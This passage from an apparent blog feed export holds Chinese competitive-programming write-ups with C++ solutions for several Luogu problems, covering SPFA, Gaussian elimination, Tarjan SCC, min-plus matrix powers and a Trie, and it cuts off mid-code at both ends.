class="line">    <span class="built_in">memset</span>(vis, <span class="literal">false</span>, <span class="built_in">sizeof</span>(vis));</span><br><span class="line">    dis[s] = <span class="number">0</span>, vis[s] = <span class="literal">true</span>;</span><br><span class="line">    q.<span class="built_in">push</span>(s);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        <span class="type">int</span> u = q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>(), vis[u] = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> ed : e[u]) &#123;</span><br><span class="line">            <span class="type">int</span> v = ed.first, w = ed.second;</span><br><span class="line">            <span class="keyword">if</span> (dis[v] &gt; dis[u] + w) &#123;</span><br><span class="line">                dis[v] = dis[u] + w;</span><br><span class="line">                <span class="keyword">if</span> (!vis[v]) q.<span class="built_in">push</span>(v), vis[v] = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> l, r;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> a[<span class="number">13</span>];</span><br><span class="line"></span><br><span class="line">    std::cin &gt;&gt; n &gt;&gt; l &gt;&gt; r;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> minA = MAXN + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        std::cin &gt;&gt; a[i];</span><br><span class="line">        minA = std::<span class="built_in">min</span>(minA, a[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; minA; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (a[j] != minA) &#123;</span><br><span class="line">                <span class="built_in">add</span>(i, (i + a[j]) % minA, a[j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">spfa</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; minA; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (r &gt;= dis[i]) ans += (r - dis[i]) / minA + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (l - <span class="number">1</span> &gt;= dis[i]) ans -= (l - <span class="number">1</span> - dis[i]) / minA + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; ans &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>图论</tag>
        <tag>最短路</tag>
        <tag>洛谷</tag>
        <tag>国家集训队</tag>
      </tags>
  </entry>
  <entry>
    <title>「SDOI2006」线性方程组 - 高斯消元</title>
    <url>/luogu-2455/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P2455">洛谷链接</a></p>
<p>已知 <span class="math inline">\(n\)</span> 元线性一次方程组。</p>
<p><span class="math display">\[
\begin{cases}
a_{1, 1} x_1 + a_{1, 2} x_2 + \cdots + a_{1, n} x_n = b_1 \\
a_{2, 1} x_1 + a_{2, 2} x_2 + \cdots + a_{2, n} x_n = b_2 \\
\cdots \\
a_{n,1} x_1 + a_{n, 2} x_2 + \cdots + a_{n, n} x_n = b_n
\end{cases}
\]</span></p>
<p>请根据输入的数据，编程输出方程组的解的情况。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>对于求 <span class="math inline">\(n\)</span>
元一次方程组，显然需要用高斯消元。但本题需要判断无解或无穷解。对于此类，我们可以在高斯消元后判断第
<span class="math inline">\(i\)</span> 行第 <span
class="math inline">\(i\)</span> 项是否为 <span
class="math inline">\(0\)</span>。若为 <span
class="math inline">\(0\)</span> 且最后一项不为 <span
class="math inline">\(0\)</span>，无解。在判断有解的前提下，第 <span
class="math inline">\(i\)</span> 行第 <span
class="math inline">\(i\)</span> 项同时为 <span
class="math inline">\(0\)</span> 则有无穷解。</p>
<p>最后注意一下需要调换增广矩阵每一行的位置。对于第 <span
class="math inline">\(i\)</span> 行可将未计算的行中最大的第 <span
class="math inline">\(i\)</span> 项所在行调换。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">double</span> a[MAXN + <span class="number">1</span>][MAXN + <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">swaps</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt;= n + <span class="number">1</span>; k++) &#123;</span><br><span class="line">        std::<span class="built_in">swap</span>(a[i][k], a[j][k]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">sorts</span><span class="params">(<span class="type">int</span> pos)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> maxn = pos;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = pos + <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">fabs</span>(a[maxn][pos]) &lt; <span class="built_in">fabs</span>(a[i][pos])) &#123;</span><br><span class="line">            maxn = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pos != maxn) <span class="built_in">swaps</span>(pos, maxn);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">gauss</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="built_in">sorts</span>(i);</span><br><span class="line">        <span class="keyword">if</span> (a[i][i] == <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = i + <span class="number">1</span>; j &lt;= n + <span class="number">1</span>; j++) a[i][j] /= a[i][i];</span><br><span class="line">        a[i][i] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = i + <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = i + <span class="number">1</span>; k &lt;= n + <span class="number">1</span>; k++) &#123;</span><br><span class="line">                a[j][k] -= a[i][k] * a[j][i] / a[i][i];</span><br><span class="line">            &#125;</span><br><span class="line">            a[j][i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">solve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = n; i &gt; <span class="number">1</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt; i; j++) &#123;</span><br><span class="line">            a[j][n + <span class="number">1</span>] -= a[i][n + <span class="number">1</span>] * a[j][i] / a[i][i];</span><br><span class="line">            a[j][i] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> op = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (a[i][i] == <span class="number">0</span> &amp;&amp; a[i][n + <span class="number">1</span>] != <span class="number">0</span>) op = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span> (a[i][i] == <span class="number">0</span> &amp;&amp; a[i][n + <span class="number">1</span>] == <span class="number">0</span> &amp;&amp; op == <span class="number">1</span>) op = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> op;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n + <span class="number">1</span>; j++) &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%lf&quot;</span>, &amp;a[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">gauss</span>();</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> op = <span class="built_in">solve</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (op != <span class="number">1</span>) std::cout &lt;&lt; op &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) <span class="built_in">printf</span>(<span class="string">&quot;x%d=%.2lf\n&quot;</span>, i, a[i][n + <span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>省选</tag>
        <tag>高斯消元</tag>
        <tag>洛谷</tag>
        <tag>2006</tag>
        <tag>SDOI</tag>
      </tags>
  </entry>
  <entry>
    <title>「洛谷 P2746」校园网 Network of Schools - 强连通分量</title>
    <url>/luogu-2746/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P2746">洛谷链接</a></p>
<p>一些学校连入一个电脑网络。那些学校已订立了协议：每个学校都会给其它的一些学校分发软件（称作“接受学校”）。注意即使
<span class="math inline">\(B\)</span> 在 <span
class="math inline">\(A\)</span> 学校的分发列表中，<span
class="math inline">\(A\)</span> 也不一定在 <span
class="math inline">\(B\)</span> 学校的列表中。</p>
<p>你要写一个程序计算，根据协议，为了让网络中所有的学校都用上新软件，必须接受新软件副本的最少学校数目（子任务
A）。更进一步，我们想要确定通过给任意一个学校发送新软件，这个软件就会分发到网络中的所有学校。为了完成这个任务，我们可能必须扩展接收学校列表，使其加入新成员。计算最少需要增加几个扩展，使得不论我们给哪个学校发送新软件，它都会到达其余所有的学校（子任务
B）。一个扩展就是在一个学校的接收学校列表中引入一个新成员。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>显然这道题考的是强连通分量。将学校用节点表示，分发关系用有向边表示，接着用
Tarjan 求一遍之后缩点即可。</p>
<p>第一问答案即为缩点后入度为 <span class="math inline">\(0\)</span>
的节点个数，第二问答案即为入度为 <span class="math inline">\(0\)</span>
和出度为 <span class="math inline">\(0\)</span>
的节点数两者的最大值。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">std::vector&lt;<span class="type">int</span>&gt; e[MAXN + <span class="number">1</span>];</span><br><span class="line"><span class="type">int</span> dfn[MAXN + <span class="number">1</span>], low[MAXN + <span class="number">1</span>], num = <span class="number">0</span>, cnt = <span class="number">0</span>;</span><br><span class="line">std::stack&lt;<span class="type">int</span>&gt; sta;</span><br><span class="line"><span class="type">int</span> ins[MAXN + <span class="number">1</span>], c[MAXN + <span class="number">1</span>];</span><br><span class="line">std::vector&lt;<span class="type">int</span>&gt; scc[MAXN + <span class="number">1</span>];</span><br><span class="line">std::vector&lt;<span class="type">int</span>&gt; ec[MAXN + <span class="number">1</span>], ecRev[MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tarjan</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    dfn[x] = low[x] = ++num;</span><br><span class="line">    sta.<span class="built_in">push</span>(x);</span><br><span class="line">    ins[x] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> each : e[x]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!dfn[each]) &#123;</span><br><span class="line">            <span class="built_in">tarjan</span>(each);</span><br><span class="line">            low[x] = std::<span class="built_in">min</span>(low[x], low[each]);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ins[each]) &#123;</span><br><span class="line">            low[x] = std::<span class="built_in">min</span>(low[x], dfn[each]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (dfn[x] == low[x]) &#123;</span><br><span class="line">        cnt++;</span><br><span class="line">        <span class="type">int</span> y;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            y = sta.<span class="built_in">top</span>();</span><br><span class="line">            sta.<span class="built_in">pop</span>();</span><br><span class="line">            ins[y] = <span class="number">0</span>;</span><br><span class="line">            c[y] = cnt, scc[cnt].<span class="built_in">push_back</span>(y);</span><br><span class="line">        &#125; <span class="keyword">while</span> (x != y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::cin &gt;&gt; n;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>, x; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x) != EOF) &#123;</span><br><span class="line">            <span class="keyword">if</span> (x == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">            e[i].<span class="built_in">push_back</span>(x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(dfn, <span class="number">0</span>, <span class="built_in">sizeof</span>(dfn));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!dfn[i]) &#123;</span><br><span class="line">            <span class="built_in">tarjan</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> each : e[i]) &#123;</span><br><span class="line">            <span class="keyword">if</span> (c[i] == c[each]) <span class="keyword">continue</span>;</span><br><span class="line">            ec[c[i]].<span class="built_in">push_back</span>(c[each]);</span><br><span class="line">            ecRev[c[each]].<span class="built_in">push_back</span>(c[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> count1 = <span class="number">0</span>, count2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= cnt; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (ecRev[i].<span class="built_in">size</span>() == <span class="number">0</span>) count1++;</span><br><span class="line">        <span class="keyword">if</span> (ec[i].<span class="built_in">size</span>() == <span class="number">0</span>) count2++;</span><br><span class="line">    &#125;</span><br><span class="line">    count2 = std::<span class="built_in">max</span>(count1, count2);</span><br><span class="line">    <span class="keyword">if</span> (cnt == <span class="number">1</span>) count1 = <span class="number">1</span>, count2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; count1 &lt;&lt; std::endl &lt;&lt;  count2 &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>图论</tag>
        <tag>Tarjan</tag>
        <tag>强连通分量</tag>
        <tag>洛谷</tag>
        <tag>USACO</tag>
      </tags>
  </entry>
  <entry>
    <title>「洛谷 P2886」Cow Relays - 矩阵乘法 + 最短路 + DP</title>
    <url>/luogu-2886/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P2886">洛谷链接</a></p>
<p>给定一张 <span class="math inline">\(t\)</span>
条边的无向连通图，求从 <span class="math inline">\(s\)</span> 到 <span
class="math inline">\(e\)</span> 经过 <span
class="math inline">\(n\)</span> 条边的最短路长度。</p>
<p>数据范围：<span class="math inline">\(1 \le n \le
10^6\)</span>、<span class="math inline">\(2 \le t \le
100\)</span>、<span class="math inline">\(1 \le s, t \le
1000\)</span>。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>看到这个数据范围可得出实际点数不超过 <span
class="math inline">\(200\)</span>。可以想到 Floyd 算法。Floyd
的本质就是 DP。它的第 <span class="math inline">\(k\)</span>
次更新数据就是计算从该点出发不超过 <span
class="math inline">\(k\)</span>
条边所能到达的最短路。于是我们使用邻接矩阵建图的时候可将自环去掉，Floyd
的第 <span class="math inline">\(k\)</span>
次更新数据就计算的是从该点出发经过恰好 <span
class="math inline">\(k\)</span> 条边所能到达的最短路。</p>
<p>于是我们可以想到使用矩阵加速 Floyd
的计算。我们可以推出广义矩阵乘法：<span class="math inline">\(C_{i, j} =
\min\limits_{1 \le k \le n}\{A_{i, k} + B_{k,
j}\}\)</span>，然后将邻接矩阵存在矩阵中即可。这样就可以使用矩阵快速幂求解。计算从
<span class="math inline">\(s\)</span> 到 <span
class="math inline">\(e\)</span> 经过 <span
class="math inline">\(n\)</span> 条边的最短路即为 <span
class="math inline">\(C^n_{s, t}\)</span>。</p>
<p>写代码时注意离散化即可。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;climits&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">200</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Matrix</span> &#123;</span><br><span class="line">    <span class="type">int</span> a[MAXN + <span class="number">1</span>][MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Matrix</span>() &#123; <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= MAXN; i++) <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= MAXN; j++) a[i][j] = INT_MAX; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> &amp;<span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span> </span>&#123; <span class="keyword">return</span> a[i][j]; &#125;</span><br><span class="line">    <span class="function"><span class="type">const</span> <span class="type">int</span> &amp;<span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> a[i][j]; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Matrix <span class="keyword">operator</span>*(Matrix a, Matrix b) &#123;</span><br><span class="line">    Matrix res;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= MAXN; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= MAXN; j++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt;= MAXN; k++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">a</span>(i, k) != INT_MAX &amp;&amp; <span class="built_in">b</span>(k, j) != INT_MAX) &#123;</span><br><span class="line">                    <span class="built_in">res</span>(i, j) = std::<span class="built_in">min</span>(<span class="built_in">res</span>(i, j), <span class="built_in">a</span>(i, k) + <span class="built_in">b</span>(k, j));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Matrix <span class="title">pow</span><span class="params">(Matrix a, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    Matrix res = a;</span><br><span class="line">    n--;</span><br><span class="line">    <span class="keyword">for</span> (; n; n &gt;&gt;= <span class="number">1</span>, a = a * a) <span class="keyword">if</span> (n &amp; <span class="number">1</span>) res = res * a;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n, t, s, e;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d %d&quot;</span>, &amp;n, &amp;t, &amp;s, &amp;e);</span><br><span class="line"></span><br><span class="line">    Matrix a;</span><br><span class="line">    std::map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; mp;</span><br><span class="line">    <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; t; i++) &#123;</span><br><span class="line">        <span class="type">int</span> w, u, v;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>, &amp;w, &amp;u, &amp;v);</span><br><span class="line">        <span class="keyword">if</span> (!mp[u]) mp[u] = ++cnt;</span><br><span class="line">        <span class="keyword">if</span> (!mp[v]) mp[v] = ++cnt;</span><br><span class="line">        <span class="built_in">a</span>(mp[u], mp[v]) = std::<span class="built_in">min</span>(<span class="built_in">a</span>(mp[u], mp[v]), w);</span><br><span class="line">        <span class="built_in">a</span>(mp[v], mp[u]) = std::<span class="built_in">min</span>(<span class="built_in">a</span>(mp[v], mp[u]), w);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Matrix ans = <span class="built_in">pow</span>(a, n);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">ans</span>(mp[s], mp[e]));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>DP</tag>
        <tag>图论</tag>
        <tag>最短路</tag>
        <tag>数学</tag>
        <tag>2007</tag>
        <tag>USACO</tag>
        <tag>矩阵乘法</tag>
      </tags>
  </entry>
  <entry>
    <title>「洛谷 P2922」Secret Message - Trie</title>
    <url>/luogu-2922/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P2922">洛谷链接</a></p>
<p>贝茜正在领导奶牛们逃跑．为了联络，奶牛们互相发送秘密信息．</p>
<p>信息是二进制的，共有 <span class="math inline">\(M\)</span>（<span
class="math inline">\(1 \le M \le
50000\)</span>）条，反间谍能力很强的约翰已经部分拦截了这些信息，知道了第
<span class="math inline">\(i\)</span> 条二进制信息的前 <span
class="math inline">\(b_i\)</span>（<span class="math inline">\(l \le
b_i \le 10000\)</span>）位，他同时知道，奶牛使用 <span
class="math inline">\(N\)</span>（<span class="math inline">\(1 \le N
\le 50000\)</span>）条暗号．但是，他仅仅知道第 <span
class="math inline">\(j\)</span> 条暗号的前 <span
class="math inline">\(c_j\)</span>（<span class="math inline">\(1 \le
c_j \le 10000\)</span>）位。</p>
<p>对于每条暗号 <span
class="math inline">\(j\)</span>，他想知道有多少截得的信息能够和它匹配。也就是说，有多少信息和这条暗号有着相同的前缀。当然，这个前缀长度必须等于暗号和那条信息长度的较小者。</p>
<p>在输入文件中，位的总数（即 <span class="math inline">\(\sum b_i +
\sum c_i\)</span>）不会超过 <span
class="math inline">\(500000\)</span>。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>本题显然是一道字符串题，我们可以用 Trie 解决。我们可以将所有的 <span
class="math inline">\(b_i\)</span> 插入到一个 Trie 中。对于每个 <span
class="math inline">\(c_i\)</span>，我们有下列两种统计：</p>
<ul>
<li>通过查询路径统计 <strong>比暗号短的信息</strong> 的个数；</li>
<li>通过在暗号尾部 DFS 统计 <strong>比暗号长的信息</strong>
的个数。</li>
</ul>
<p>这里单纯的 DFS 会 TLE，加个记忆化就行了。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">500000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> trie[MAXN + <span class="number">2</span>][<span class="number">2</span>], tot = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> end[MAXN + <span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> size[MAXN + <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">insert</span><span class="params">(<span class="type">int</span> *str, <span class="type">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> p = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="type">int</span> ch = str[i];</span><br><span class="line">        <span class="keyword">if</span> (trie[p][ch] == <span class="number">0</span>) trie[p][ch] = ++tot;</span><br><span class="line">        p = trie[p][ch];</span><br><span class="line">    &#125;</span><br><span class="line">    end[p]++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getSize</span><span class="params">(<span class="type">int</span> p)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (size[p] != <span class="number">-1</span>) <span class="keyword">return</span> size[p];</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    size[p] = end[p];</span><br><span class="line">    size[p] += <span class="built_in">getSize</span>(trie[p][<span class="number">0</span>]);</span><br><span class="line">    size[p] += <span class="built_in">getSize</span>(trie[p][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> size[p];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span 